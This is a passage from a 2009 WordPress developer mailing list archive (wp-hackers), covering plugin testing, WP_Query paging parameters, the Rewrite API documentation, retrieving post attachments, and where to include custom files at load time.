day Europe trip" trail.  Other examples might be sites with
weight-training exercises or yoga poses arranged in different
sequences. We hope a "medium is the message" effect takes over, and
people innovate a whole new blogging genre called "trail blogging" :)

>
> P.S. -- I don't think this topic is "OT" at all. ?This is a
> significant WP plugin.

You just made my day :)

Venkat

From scribu at gmail.com  Sun Oct  4 17:19:31 2009
From: scribu at gmail.com (scribu)
Date: Sun, 4 Oct 2009 20:19:31 +0300
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>
References: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>
Message-ID: <349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com>

I like the ideea of trails, but I can't figure out how to view one.

I can't get past the Bird's eye view here:
http://blog.trailmeme.com/trails/?t=2bffff2a-efe8-102c-b39a-12313a00c9d2

I'm on Ubuntu 9.10.


On Sun, Oct 4, 2009 at 7:18 PM, Venkatesh Rao <vgururao at gmail.com> wrote:

> Hi Stephen
>
> > What it reminds me of is "Choose Your Own Adventure" Books.  I think
> > that's as good a metaphor as any for describing what it does.
>
> Yes, this is the perfect metaphor for those who've read those books
> (there were several Hardy Boys/Nancy Drew books that used that model).
> I actually think that idea was rather unnatural in book form, but is a
> natural fit for the Web. In fact, one of our bolder ambitions for the
> trails technology is to enable people to get beyond the book metaphor
> retrofitted on to the Web, and really start exploiting the potential
> of the Web as a creative medium in its own right, where much of the
> creativity is in coming up with thoughtful patterns of hyperlinks for
> your own and others' content. "Painting with hyperlinks" so to speak,
> which is painful with bare-metal hyperlinking technolog, but will
> hopefully be way more fun with trails.
>
> >
> > I can also see using this for setting up a series of instructions that
> > vary based on your situation, but for which certain steps are common
> > to different situations.  Imagine a site with instructions for
> > replacing parts of a computer.  The "open the case" step will pretty
> > much always be there, but "remove the the hard drive" only for certain
> > projects.  With Trails you only have to write the "open the case" step
> > once and include it in different trails.
> >
> > Am I understanding Trails correctly?  :)
>
> Absolutely. This reusability argument is central. Similar to the
> troubleshooting domain is the travel domain: the "Rome" page can be
> the same whether you include it in a "3 day Italy trip" trail or a "15
> day Europe trip" trail.  Other examples might be sites with
> weight-training exercises or yoga poses arranged in different
> sequences. We hope a "medium is the message" effect takes over, and
> people innovate a whole new blogging genre called "trail blogging" :)
>
> >
> > P.S. -- I don't think this topic is "OT" at all.  This is a
> > significant WP plugin.
>
> You just made my day :)
>
> Venkat
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From scribu at gmail.com  Sun Oct  4 17:20:37 2009
From: scribu at gmail.com (scribu)
Date: Sun, 4 Oct 2009 20:20:37 +0300
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com>
References: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>
	<349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com>
Message-ID: <349fe48b0910041020u186f7031qb0e8397b9fab7ad7@mail.gmail.com>

On Sun, Oct 4, 2009 at 8:19 PM, scribu <scribu at gmail.com> wrote:

> I like the ideea of trails, but I can't figure out how to view one.
>
> I can't get past the Bird's eye view here:
> http://blog.trailmeme.com/trails/?t=2bffff2a-efe8-102c-b39a-12313a00c9d2
>
> I'm on Ubuntu 9.10.


Right, that's actually Ubuntu 9.04 (jaunty).


-- 
http://scribu.net

From wp-hackers at striderweb.com  Sun Oct  4 17:31:13 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sun, 4 Oct 2009 12:31:13 -0500
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>
References: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>
Message-ID: <70DE706C-1FB9-4E78-964D-9C0DD8E2C1C5@striderweb.com>


On Oct 4, 2009, at 11:18 AM, Venkatesh Rao wrote:

> Absolutely. This reusability argument is central. Similar to the
> troubleshooting domain is the travel domain: the "Rome" page can be
> the same whether you include it in a "3 day Italy trip" trail or a "15
> day Europe trip" trail.  Other examples might be sites with
> weight-training exercises or yoga poses arranged in different
> sequences. We hope a "medium is the message" effect takes over, and
> people innovate a whole new blogging genre called "trail blogging" :)

I have a multiblog system that has a different installation depending  
on how you're setting up the various blogs.  I've been imagining  
something exactly like this for settings up a "How to set up"  
section.  I'll give it a shot and if it works out I'll post the  
results back to the list. :)  Thanks.

Stephen


-- 
Stephen Rider
http://striderweb.com/





From wp-hackers at striderweb.com  Sun Oct  4 17:34:23 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sun, 4 Oct 2009 12:34:23 -0500
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com>
References: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>
	<349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com>
Message-ID: <523D3234-ABE5-4A92-88B1-8776611E7F7A@striderweb.com>


On Oct 4, 2009, at 12:19 PM, scribu wrote:

> I like the ideea of trails, but I can't figure out how to view one.
>
> I can't get past the Bird's eye view here:
> http://blog.trailmeme.com/trails/?t=2bffff2a-efe8-102c-b39a-12313a00c9d2

Look for the "Word Trails" sidebar on the right side.
<http://blog.trailmeme.com/2009/09/about-trails/?t=8>

I agree it could be better marked.  I hope there is a way to put those  
links at the bottom of each article instead of in the sidebar....

Stephen

From william.canino at googlemail.com  Sun Oct  4 18:04:52 2009
From: william.canino at googlemail.com (William Canino)
Date: Sun, 4 Oct 2009 14:04:52 -0400
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <161617690910021346j5ecc0409i5cfd1bd7ac384ca9@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com>
	<349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com>
	<e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com>
	<161617690910020649l2ced8f39q291b11be08f94787@mail.gmail.com>
	<e4dc67e0910021118p1e12a929ke15432fc2512b06@mail.gmail.com>
	<161617690910021346j5ecc0409i5cfd1bd7ac384ca9@mail.gmail.com>
Message-ID: <e4dc67e0910041104m5fb9253dj9321c467107c7aad@mail.gmail.com>

Hello all,

Regarding

> $my_query = new WP_Query(array('post__in' => array([very long array of post IDs])));
> update_post_caches($my_query->posts);
> echo $get_permalink(1);
> echo $get_the_title(2);
>
> Do you know why WordPress is still making SQL
> queries on lines 3 and 4? Shouldn't they be already in
> the object cache?

I found the answer ... and subsequently found an irregularity in the
WordPress core.  I don't know if I should call it a bug.

get_posts is automatically adding "LIMIT 0, 6" to the SQL statement. 6
is the number of posts per page set in the blog's Reading settings.
That's why posts 1 and 2 are not in the object cache.  Furthermore,
adding either of the following

'numberposts' => -1  // as per Codex
'nopaging' => true // as per Codex

to the call, such as, $my_query = new WP_Query(array('post__in' =>
[very long array of post IDs], 'nopaging' => true)); makes no
difference.

I opened WordPress's query.php and examined it, and found what I had to use:

new WP_Query(array('post__in' => [very long array of post IDs],
'posts_per_page' => 100000));

or some high number.  This is the solution.

Moral of the Story: If one uses WP_Query for one's ends, he must set
all the parameters he needs so that the custom WP_Query doesn't use
the blog's settings.

Is this an irregularity or is this a bug?

W

2009/10/2 Otto <otto at ottodestruct.com>:
> That's fine, but it still doesn't show the actual contents of the
> cache. You're going to have to dump the cache before and after the
> get_the_title call to see why it's missing.
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Sun Oct  4 18:21:31 2009
From: william.canino at googlemail.com (William Canino)
Date: Sun, 4 Oct 2009 14:21:31 -0400
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <523D3234-ABE5-4A92-88B1-8776611E7F7A@striderweb.com>
References: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>
	<349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com>
	<523D3234-ABE5-4A92-88B1-8776611E7F7A@striderweb.com>
Message-ID: <e4dc67e0910041121v832daeeva5258bbf4a3955a5@mail.gmail.com>

> I agree it could be better marked.  I hope there is a way to put those links
> at the bottom of each article instead of in the sidebar....
>
> Stephen

Exactly what I said and exactly the first mod I will do to this plugin.

I cannot presume that my readers have 27-inch monitors.

W


2009/10/4 Stephen Rider <wp-hackers at striderweb.com>:
>
> On Oct 4, 2009, at 12:19 PM, scribu wrote:
>
>> I like the ideea of trails, but I can't figure out how to view one.
>>
>> I can't get past the Bird's eye view here:
>> http://blog.trailmeme.com/trails/?t=2bffff2a-efe8-102c-b39a-12313a00c9d2
>
> Look for the "Word Trails" sidebar on the right side.
> <http://blog.trailmeme.com/2009/09/about-trails/?t=8>
>
> I agree it could be better marked. ?I hope there is a way to put those links
> at the bottom of each article instead of in the sidebar....
>
> Stephen
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From emartin24 at gmail.com  Sun Oct  4 22:11:22 2009
From: emartin24 at gmail.com (Eric Martin)
Date: Sun, 4 Oct 2009 15:11:22 -0700 (PDT)
Subject: [wp-hackers] Rewrite API: add_base() ?
Message-ID: <a9a65bec-ddcf-4af1-ad5e-a40d93a51fce@g1g2000pra.googlegroups.com>

I see this function on the codex[1], but can't find it in the code.
Just curious if the codex is old/incorrect or if I am missing
something ;)

[1] http://codex.wordpress.org/Rewrite_API#add_base.28.29

From wordpress at dd32.id.au  Mon Oct  5 03:54:56 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Mon, 05 Oct 2009 14:54:56 +1100
Subject: [wp-hackers] Rewrite API: add_base() ?
In-Reply-To: <a9a65bec-ddcf-4af1-ad5e-a40d93a51fce@g1g2000pra.googlegroups.com>
References: <a9a65bec-ddcf-4af1-ad5e-a40d93a51fce@g1g2000pra.googlegroups.com>
Message-ID: <op.u1a6hoqdspxmuu@dd32.no-ip.com>

On Mon, 05 Oct 2009 09:11:22 +1100, Eric Martin <emartin24 at gmail.com>  
wrote:

> I see this function on the codex[1], but can't find it in the code.
> Just curious if the codex is old/incorrect or if I am missing
> something ;)
>
> [1] http://codex.wordpress.org/Rewrite_API#add_base.28.29

By the future tense of the writing there, seems to suggest that was a  
initial draft of what the Rewrite API should become..

I'm pretty sure theres no API to add what you're after though, Your best  
bet is to use add_rewrite_rule('/my-base/([^/]+)/?', 'inde.... I think


-- 
--
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au/
WordPressQI: http://wordpressqi.com/

From otto at ottodestruct.com  Mon Oct  5 14:14:41 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 5 Oct 2009 09:14:41 -0500
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <e4dc67e0910041104m5fb9253dj9321c467107c7aad@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com> 
	<349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com> 
	<e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com> 
	<161617690910020649l2ced8f39q291b11be08f94787@mail.gmail.com> 
	<e4dc67e0910021118p1e12a929ke15432fc2512b06@mail.gmail.com> 
	<161617690910021346j5ecc0409i5cfd1bd7ac384ca9@mail.gmail.com> 
	<e4dc67e0910041104m5fb9253dj9321c467107c7aad@mail.gmail.com>
Message-ID: <161617690910050714u77cf3300x8471239465406500@mail.gmail.com>

"numberposts" only works with the get_posts call, not with a WP_Query object.

A WP_Query expects either "posts_per_page" or "showposts" (which is
deprecated) for the number of posts.

Setting posts_per_page to -1 will have the same effect as setting
nopaging to true. Either will eliminate the LIMIT section entirely,
making it return all posts.

And yes, if you fail to specify a parameter, then it'll take it from defaults.

-Otto



On Sun, Oct 4, 2009 at 1:04 PM, William Canino
<william.canino at googlemail.com> wrote:
> Hello all,
>
> Regarding
>
>> $my_query = new WP_Query(array('post__in' => array([very long array of post IDs])));
>> update_post_caches($my_query->posts);
>> echo $get_permalink(1);
>> echo $get_the_title(2);
>>
>> Do you know why WordPress is still making SQL
>> queries on lines 3 and 4? Shouldn't they be already in
>> the object cache?
>
> I found the answer ... and subsequently found an irregularity in the
> WordPress core. ?I don't know if I should call it a bug.
>
> get_posts is automatically adding "LIMIT 0, 6" to the SQL statement. 6
> is the number of posts per page set in the blog's Reading settings.
> That's why posts 1 and 2 are not in the object cache. ?Furthermore,
> adding either of the following
>
> 'numberposts' => -1 ?// as per Codex
> 'nopaging' => true // as per Codex
>
> to the call, such as, $my_query = new WP_Query(array('post__in' =>
> [very long array of post IDs], 'nopaging' => true)); makes no
> difference.
>
> I opened WordPress's query.php and examined it, and found what I had to use:
>
> new WP_Query(array('post__in' => [very long array of post IDs],
> 'posts_per_page' => 100000));
>
> or some high number. ?This is the solution.
>
> Moral of the Story: If one uses WP_Query for one's ends, he must set
> all the parameters he needs so that the custom WP_Query doesn't use
> the blog's settings.
>
> Is this an irregularity or is this a bug?
>
> W
>
> 2009/10/2 Otto <otto at ottodestruct.com>:
>> That's fine, but it still doesn't show the actual contents of the
>> cache. You're going to have to dump the cache before and after the
>> get_the_title call to see why it's missing.
>>
>> -Otto
>> Sent from Memphis, TN, United States
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From emartin24 at gmail.com  Mon Oct  5 15:53:39 2009
From: emartin24 at gmail.com (Eric Martin)
Date: Mon, 5 Oct 2009 08:53:39 -0700 (PDT)
Subject: [wp-hackers] Rewrite API: add_base() ?
In-Reply-To: <op.u1a6hoqdspxmuu@dd32.no-ip.com>
References: <a9a65bec-ddcf-4af1-ad5e-a40d93a51fce@g1g2000pra.googlegroups.com>
	<op.u1a6hoqdspxmuu@dd32.no-ip.com>
Message-ID: <6e4126a8-720a-46d0-9d17-b081c1818301@m7g2000prd.googlegroups.com>

On Oct 4, 8:54?pm, "Dion Hulse (dd32)" <wordpr... at dd32.id.au> wrote:
> On Mon, 05 Oct 2009 09:11:22 +1100, Eric Martin <emarti... at gmail.com> ?
> wrote:
>
> > I see this function on the codex[1], but can't find it in the code.
> > Just curious if the codex is old/incorrect or if I am missing
> > something ;)
>
> > [1]http://codex.wordpress.org/Rewrite_API#add_base.28.29
>
> By the future tense of the writing there, seems to suggest that was a ?
> initial draft of what the Rewrite API should become..

In looking at the codex page history, it definitely seems to have been
written before implementation. It looks like specific "base" variables
were used (category_base, tag_base, etc.) instead of a more abstracted
add_base() function.

>
> I'm pretty sure theres no API to add what you're after though, Your best ?
> bet is to use add_rewrite_rule('/my-base/([^/]+)/?', 'inde.... I think

Thanks. So, are there any objections to removing the add_base()
section from the Rewrite API codex?

--
Eric Martin
http://www.ericmmartin.com

From bryanharley at gmail.com  Mon Oct  5 19:16:11 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Mon, 5 Oct 2009 12:16:11 -0700
Subject: [wp-hackers] Images attached to posts/pages?
Message-ID: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>

Can someone explain the concept of how an image (when uploaded via the
"Edit Post" or "Edit Page" pages) becomes attached to said post or
page?

If I were to go to the "About" page and upload 4 images from the image
uploader and not insert any of these into my post body... those 4
images are still associated will that page, correct?

Is there any way to pull these images via PHP?  Is there a template or
reference tag?  I can use the [gallery] shortcode, but what if I
wanted the images displayed in a lightbox gallery for example?

From otto at ottodestruct.com  Mon Oct  5 19:23:48 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 5 Oct 2009 14:23:48 -0500
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>
References: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>
Message-ID: <161617690910051223u414cadedje90bfa45cf9dd002@mail.gmail.com>

Attachments are essentially children of the post they're attached to.

They have the post_parent set to the id of the post, and they have a
post_type of "attachment".

To get attachments of a post:
$attachments = get_children( array('post_parent' => $post_id,
'post_type' => 'attachment') );

To only get image attachments:
$attachments = get_children( array('post_parent' => $id, 'post_type'
=> 'attachment', 'post_mime_type' => 'image') );


Once you have that, you can basically do this sort of thing:
foreach ( $attachments as $att_id => $attachment )
     echo wp_get_attachment_link($att_id, $size, true);

And so forth. There's several wp_get_attachment_* functions you can
use to get various bits from the attachment posts, once you have their
id's.

-Otto


On Mon, Oct 5, 2009 at 2:16 PM, Bryan Harley <bryanharley at gmail.com> wrote:
> Can someone explain the concept of how an image (when uploaded via the
> "Edit Post" or "Edit Page" pages) becomes attached to said post or
> page?
>
> If I were to go to the "About" page and upload 4 images from the image
> uploader and not insert any of these into my post body... those 4
> images are still associated will that page, correct?
>
> Is there any way to pull these images via PHP? ?Is there a template or
> reference tag? ?I can use the [gallery] shortcode, but what if I
> wanted the images displayed in a lightbox gallery for example?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From pnts at protocol7.net  Mon Oct  5 19:24:34 2009
From: pnts at protocol7.net (A. Mignolo)
Date: Mon, 5 Oct 2009 12:24:34 -0700
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>
References: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>
Message-ID: <C9D5CC50-8E0A-42D1-AEBC-6CDD753E1A3B@protocol7.net>


> Is there any way to pull these images via PHP?  Is there a template or
> reference tag?  I can use the [gallery] shortcode, but what if I
> wanted the images displayed in a lightbox gallery for example?


I use wp_get_attachment_image to pull out images for use in lightbox  
or carousel displays.

http://codex.wordpress.org/Function_Reference/wp_get_attachment_image


---
A. Mignolo
http://protocol7.net
Public Key: http://protocol7.net/txt/pnts.gpg





From wordpress at dd32.id.au  Mon Oct  5 21:57:12 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Tue, 06 Oct 2009 08:57:12 +1100
Subject: [wp-hackers] Rewrite API: add_base() ?
In-Reply-To: <6e4126a8-720a-46d0-9d17-b081c1818301@m7g2000prd.googlegroups.com>
References: <a9a65bec-ddcf-4af1-ad5e-a40d93a51fce@g1g2000pra.googlegroups.com>
	<op.u1a6hoqdspxmuu@dd32.no-ip.com>
	<6e4126a8-720a-46d0-9d17-b081c1818301@m7g2000prd.googlegroups.com>
Message-ID: <op.u1cklmv4spxmuu@dd32.no-ip.com>

On Tue, 06 Oct 2009 02:53:39 +1100, Eric Martin <emartin24 at gmail.com>  
wrote:

> On Oct 4, 8:54 pm, "Dion Hulse (dd32)" <wordpr... at dd32.id.au> wrote:
>> I'm pretty sure theres no API to add what you're after though, Your  
>> best bet is to use add_rewrite_rule('/my-base/([^/]+)/?', 'inde.... I  
>> think
>
> Thanks. So, are there any objections to removing the add_base()
> section from the Rewrite API codex?

The entire article should really be rewritten in current phrase, with  
better details and examples.. and updated to cover all the changes to  
rewrite that exist since itt..

I have added a note that says that add_base was never actually  
implemented, but If you feel like cleaning it up, go ahead.

-- 
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au
WordPressQI: http://wordpressqi.com/

From frank at bueltge.de  Tue Oct  6 14:59:18 2009
From: frank at bueltge.de (Frank Bueltge)
Date: Tue, 6 Oct 2009 16:59:18 +0200
Subject: [wp-hackers] Change vor wp-load.php
Message-ID: <db047a770910060759v217bfd76o9f27f82ca08b2f9c@mail.gmail.com>

Hello Hackers,

i use different libraries for more security in WordPress and i load
this with include in the wp-load.php.
Please, can add an constant or file_exists() for an custom file to
hook/include in this point before load WP.

Maybe this is a solution:
if ( defined('WP_LOAD') )
	@include ABSPATH . '/advanced-load.php';

In the file advanced-load.php will iclude it my files and other
content for the load to WP.

Sorry for my bad english.
I hope you understand my problem.
Frank

__
Das neue Buch: Das WordPress-Buch, Vom Blog zum Content-Management-System
  ISBN 978-3937514703
  http://wordpress-buch.bueltge.de/das-wordpress-buch/

Das Buch: WordPress - Weblogs einrichten und administrieren, Open Source Press
  ISBN 978-3-937514-33-8
  http://wordpress-buch.bueltge.de/das-buch/

http://bueltge.de : frank at bueltge.de
http://wpengineer.com : frank at wpengineer.com
__
Frank B?ltge
Tel:    +49 36428 122529
Mobil:  +49 170 5322053
E-Mail: f.bueltge at inpsyde.com

Inpsyde GmbH
Mutzer Heide 3
51467 Bergisch Gladbach

Steuernr: 204/5756/0999 Steueridentnr.: DE263849534
Gesch?ftsf?hrender Gesellschafter: Heinz Roh? HRB 65224 Amtsgericht K?ln

http://inpsyde.com
http://pressthis.de

From otto at ottodestruct.com  Tue Oct  6 17:56:37 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 6 Oct 2009 12:56:37 -0500
Subject: [wp-hackers] Change vor wp-load.php
In-Reply-To: <db047a770910060759v217bfd76o9f27f82ca08b2f9c@mail.gmail.com>
References: <db047a770910060759v217bfd76o9f27f82ca08b2f9c@mail.gmail.com>
Message-ID: <161617690910061056t598f33fbk752a21507c149325@mail.gmail.com>

No, you should put your includes in the wp-config.php instead.

wp-config.php is included almost immediately in the wp-load.php, and
wp-config.php doesn't get overwritten on an upgrade either.

-Otto

On Tue, Oct 6, 2009 at 9:59 AM, Frank Bueltge <frank at bueltge.de> wrote:
> Hello Hackers,
>
> i use different libraries for more security in WordPress and i load
> this with include in the wp-load.php.
> Please, can add an constant or file_exists() for an custom file to
> hook/include in this point before load WP.
>
> Maybe this is a solution:
> if ( defined('WP_LOAD') )
> ? ? ? ?@include ABSPATH . '/advanced-load.php';
>
> In the file advanced-load.php will iclude it my files and other
> content for the load to WP.
>
> Sorry for my bad english.
> I hope you understand my problem.
> Frank
>

From frank at bueltge.de  Tue Oct  6 18:07:45 2009
From: frank at bueltge.de (Frank Bueltge)
Date: Tue, 6 Oct 2009 20:07:45 +0200
Subject: [wp-hackers] Change vor wp-load.php
In-Reply-To: <161617690910061056t598f33fbk752a21507c149325@mail.gmail.com>
References: <db047a770910060759v217bfd76o9f27f82ca08b2f9c@mail.gmail.com> 
	<161617690910061056t598f33fbk752a21507c149325@mail.gmail.com>
Message-ID: <db047a770910061107q9502e85n45c47001c9053fb0@mail.gmail.com>

Thanks for your answer.
You say, it is also possible to include in the wp-config.php?
is is correct after:
require_once(ABSPATH . 'wp-settings.php');

So it is is possible to use the constant ABSPATH

Thanks


On Tue, Oct 6, 2009 at 7:56 PM, Otto <otto at ottodestruct.com> wrote:
> No, you should put your includes in the wp-config.php instead.
>
> wp-config.php is included almost immediately in the wp-load.php, and
> wp-config.php doesn't get overwritten on an upgrade either.
>
> -Otto
>
> On Tue, Oct 6, 2009 at 9:59 AM, Frank Bueltge <frank at bueltge.de> wrote:
>> Hello Hackers,
>>
>> i use different libraries for more security in WordPress and i load
>> this with include in the wp-load.php.
>> Please, can add an constant or file_exists() for an custom file to
>> hook/include in this point before load WP.
>>
>> Maybe this is a solution:
>> if ( defined('WP_LOAD') )
>> ? ? ? ?@include ABSPATH . '/advanced-load.php';
>>
>> In the file advanced-load.php will iclude it my files and other
>> content for the load to WP.
>>
>> Sorry for my bad english.
>> I hope you understand my problem.
>> Frank
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Tue Oct  6 18:15:28 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 6 Oct 2009 13:15:28 -0500
Subject: [wp-hackers] Change vor wp-load.php
In-Reply-To: <db047a770910061107q9502e85n45c47001c9053fb0@mail.gmail.com>
References: <db047a770910060759v217bfd76o9f27f82ca08b2f9c@mail.gmail.com> 
	<161617690910061056t598f33fbk752a21507c149325@mail.gmail.com> 
	<db047a770910061107q9502e85n45c47001c9053fb0@mail.gmail.com>
Message-ID: <161617690910061115q64bd2afbh2db4066ef514d9b3@mail.gmail.com>

The ABSPATH is set in wp-load.php, so you can include whatever you
want in that file wherever you want and still use ABSPATH. ABSPATH is
set for duration of the whole file.

-Otto
Sent from Memphis, TN, United States


On Tue, Oct 6, 2009 at 1:07 PM, Frank Bueltge <frank at bueltge.de> wrote:
> Thanks for your answer.
> You say, it is also possible to include in the wp-config.php?
> is is correct after:
> require_once(ABSPATH . 'wp-settings.php');
>
> So it is is possible to use the constant ABSPATH
>
> Thanks
>
>
> On Tue, Oct 6, 2009 at 7:56 PM, Otto <otto at ottodestruct.com> wrote:
>> No, you should put your includes in the wp-config.php instead.
>>
>> wp-config.php is included almost immediately in the wp-load.php, and
>> wp-config.php doesn't get overwritten on an upgrade either.
>>
>> -Otto
>>
>> On Tue, Oct 6, 2009 at 9:59 AM, Frank Bueltge <frank at bueltge.de> wrote:
>>> Hello Hackers,
>>>
>>> i use different libraries for more security in WordPress and i load
>>> this with include in the wp-load.php.
>>> Please, can add an constant or file_exists() for an custom file to
>>> hook/include in this point before load WP.
>>>
>>> Maybe this is a solution:
>>> if ( defined('WP_LOAD') )
>>> ? ? ? ?@include ABSPATH . '/advanced-load.php';
>>>
>>> In the file advanced-load.php will iclude it my files and other
>>> content for the load to WP.
>>>
>>> Sorry for my bad english.
>>> I hope you understand my problem.
>>> Frank
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From frank at bueltge.de  Tue Oct  6 18:36:56 2009
From: frank at bueltge.de (Frank Bueltge)
Date: Tue, 6 Oct 2009 20:36:56 +0200
Subject: [wp-hackers] Change vor wp-load.php
In-Reply-To: <161617690910061115q64bd2afbh2db4066ef514d9b3@mail.gmail.com>
References: <db047a770910060759v217bfd76o9f27f82ca08b2f9c@mail.gmail.com> 
	<161617690910061056t598f33fbk752a21507c149325@mail.gmail.com> 
	<db047a770910061107q9502e85n45c47001c9053fb0@mail.gmail.com> 
	<161617690910061115q64bd2afbh2db4066ef514d9b3@mail.gmail.com>
Message-ID: <db047a770910061136q51793e85hf2bd828174473260@mail.gmail.com>

Thanks a lot.
I had test this and works great.

Best regards
Frank



On Tue, Oct 6, 2009 at 8:15 PM, Otto <otto at ottodestruct.com> wrote:
> The ABSPATH is set in wp-load.php, so you can include whatever you
> want in that file wherever you want and still use ABSPATH. ABSPATH is
> set for duration of the whole file.
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Tue, Oct 6, 2009 at 1:07 PM, Frank Bueltge <frank at bueltge.de> wrote:
>> Thanks for your answer.
>> You say, it is also possible to include in the wp-config.php?
>> is is correct after:
>> require_once(ABSPATH . 'wp-settings.php');
>>
>> So it is is possible to use the constant ABSPATH
>>
>> Thanks
>>
>>
>> On Tue, Oct 6, 2009 at 7:56 PM, Otto <otto at ottodestruct.com> wrote:
>>> No, you should put your includes in the wp-config.php instead.
>>>
>>> wp-config.php is included almost immediately in the wp-load.php, and
>>> wp-config.php doesn't get overwritten on an upgrade either.
>>>
>>> -Otto
>>>
>>> On Tue, Oct 6, 2009 at 9:59 AM, Frank Bueltge <frank at bueltge.de> wrote:
>>>> Hello Hackers,
>>>>
>>>> i use different libraries for more security in WordPress and i load
>>>> this with include in the wp-load.php.
>>>> Please, can add an constant or file_exists() for an custom file to
>>>> hook/include in this point before load WP.
>>>>
>>>> Maybe this is a solution:
>>>> if ( defined('WP_LOAD') )
>>>> ? ? ? ?@include ABSPATH . '/advanced-load.php';
>>>>
>>>> In the file advanced-load.php will iclude it my files and other
>>>> content for the load to WP.
>>>>
>>>> Sorry for my bad english.
>>>> I hope you understand my problem.
>>>> Frank
>>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From davemee at gmail.com  Wed Oct  7 10:33:37 2009
From: davemee at gmail.com (Dave Mee)
Date: Wed, 7 Oct 2009 11:33:37 +0100
Subject: [wp-hackers] When archive.php is pulled in the theme,
	how does it know what category it applies to before (or as) the
	loop starts?
Message-ID: <02a401ca4739$a1b6cc20$e5246460$@com>

Hi List!

I know it's possible to pull category names from the post in the loop on
that page, but I need to find out what definitive category is being
requested.

For example - invoking site.com/category/cat-b will pull up an archive page.
However, if the first post in that category is also a member of cat-a, my
efforts to find a category name are thrown off kilter - the canonical
category should be coming from the URL, rather than the individual posts.

Is there some mechanism to look into the guts of wordpress or the query and
discover which category it thinks it's dealing with?

Dave


From william.canino at googlemail.com  Wed Oct  7 10:46:41 2009
From: william.canino at googlemail.com (William Canino)
Date: Wed, 7 Oct 2009 06:46:41 -0400
Subject: [wp-hackers] When archive.php is pulled in the theme,
	how does it know what category it applies to before (or as) the
	loop starts?
